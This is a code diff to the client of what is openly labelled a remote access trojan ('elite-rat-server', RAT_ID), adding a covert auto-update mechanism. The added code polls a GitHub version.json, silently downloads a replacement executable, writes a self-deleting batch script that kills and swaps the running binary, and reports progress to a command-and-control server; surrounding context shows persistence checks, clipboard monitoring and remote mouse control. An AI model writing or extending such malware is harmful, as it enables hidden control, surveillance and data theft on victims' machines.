@@ -78,6 +78,59 @@ def get_current_exe_path():
 EXE_PATH = get_current_exe_path()
 CURRENT_DIR = EXE_PATH.parent
 
+# --- Versioning & Auto-Update (Phase 6) ---
+CURRENT_VERSION = "2.1"
+GITHUB_USER = "XdKeerXd"
+GITHUB_REPO = "elite-rat-server"
+VERSION_URL = f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/main/version.json"
+
+def check_for_updates():
+    """Check GitHub for new version.json and auto-upgrade if found"""
+    try:
+        r = requests.get(VERSION_URL, timeout=10)
+        if r.status_code == 200:
+            data = r.json()
+            remote_version = data.get("version", "0.0")
+            update_url = data.get("url")
+            
+            if remote_version > CURRENT_VERSION and update_url:
+                print(f"[UPDATE] New version found: {remote_version}. Starting upgrade...")
+                # Log to C2 server if possible
+                try: 
+                    if sio_client and sio_client.connected:
+                        sio_client.emit('cmd_result', {
+                            'client_id': RAT_ID, 
+                            'output': f'[AUTO-UPDATE] Version {remote_version} detected. Starting upgrade...'
+                        })
+                except: pass
+                
+                execute_update(update_url)
+    except:
+        pass
+
+def execute_update(url):
+    """Download new version and swap using batch script"""
+    try:
+        temp_path = Path.home() / "AppData\\Local\\Temp\\update_new.exe"
+        r = requests.get(url, stream=True, timeout=30)
+        with open(temp_path, "wb") as f:
+            for chunk in r.iter_content(chunk_size=8192):
+                f.write(chunk)
+        
+        # Batch script to kill current process, replace EXE, and restart
+        batch_path = Path.home() / "AppData\\Local\\Temp\\updater.bat"
+        with open(batch_path, "w") as f:
+            f.write(f'@echo off\ntimeout /t 5 /nobreak > nul\n')
+            f.write(f'taskkill /F /IM "{EXE_PATH.name}" /T > nul 2>&1\n')
+            f.write(f'move /y "{temp_path}" "{EXE_PATH}"\n')
+            f.write(f'start "" "{EXE_PATH}"\n')
+            f.write(f'del "%~f0"\n')
+        
+        subprocess.Popen(["cmd.exe", "/c", str(batch_path)], creationflags=subprocess.DETACHED_PROCESS)
+        os._exit(0)
+    except:
+        pass
+
 # Disable PyAutoGUI failsafe for remote control
 if HAS_PYAUTOGUI:
     pyautogui.FAILSAFE = False
@@ -1087,27 +1140,10 @@ def handle_self_destruct(data):
         sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[ERROR] Self-destruct failed: {str(e)}'})
 
 def handle_update(data):
-    """Download new version and replace current"""
+    """Bridge for manual update request from dashboard"""
     url = data.get('url')
-    if not url: return
-    try:
-        temp_path = Path.home() / "AppData\\Local\\Temp\\update_new.exe"
-        r = requests.get(url, stream=True)
-        with open(temp_path, "wb") as f:
-            for chunk in r.iter_content(chunk_size=8192):
-                f.write(chunk)
-        
-        # Swap logic
-        batch_path = Path.home() / "AppData\\Local\\Temp\\updater.bat"
-        with open(batch_path, "w") as f:
-            f.write(f'@echo off\ntimeout /t 3 /nobreak > nul\nmove /y "{temp_path}" "{EXE_PATH}"\nstart "" "{EXE_PATH}"\ndel "%~f0"')
-            
-        subprocess.Popen(["cmd.exe", "/c", str(batch_path)], creationflags=subprocess.DETACHED_PROCESS)
-        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': '[!] Update downloaded. Restarting...'})
-        time.sleep(1)
-        os._exit(0)
-    except Exception as e:
-        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[ERROR] Update failed: {str(e)}'})
+    if url:
+        execute_update(url)
 
 def handle_mouse_move(data):
     """Handle absolute mouse movement (scaled 0.0-1.0)"""
@@ -1436,14 +1472,23 @@ def main_loop():
     threading.Thread(target=socketio_handler, daemon=True).start()
     threading.Thread(target=clipboard_monitor_thread, daemon=True).start()
     
+    # Auto-Update check on startup
+    threading.Thread(target=check_for_updates, daemon=True).start()
+    
     # Heartbeat loop
     last_persistence_check = 0
+    last_update_check = time.time()
     while is_running:
         now = time.time()
-        # Check persistence every hour (3600s)
+        # Check persistence every hour
         if now - last_persistence_check > 3600:
             check_persistence()
             last_persistence_check = now
+            
+        # Check for updates every 4 hours (14400s)
+        if now - last_update_check > 14400:
+            threading.Thread(target=check_for_updates, daemon=True).start()
+            last_update_check = now
             
         metrics = get_system_metrics()
         active_win = win32gui.GetWindowText(win32gui.GetForegroundWindow())
